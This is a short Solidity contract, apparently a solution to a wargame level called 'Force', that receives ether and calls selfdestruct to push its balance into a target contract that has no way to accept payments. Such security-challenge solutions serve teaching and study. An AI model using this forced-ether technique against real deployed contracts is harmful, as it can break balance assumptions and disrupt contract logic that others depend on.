// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './force.sol';
contract SelfDestructor {

    
    Force private immutable target;
    constructor(address _target) {
        target = Force(_target);
    }
    receive() external payable {
        
    }
    function destroy() public {
        selfdestruct(payable(address(target)));
    }

}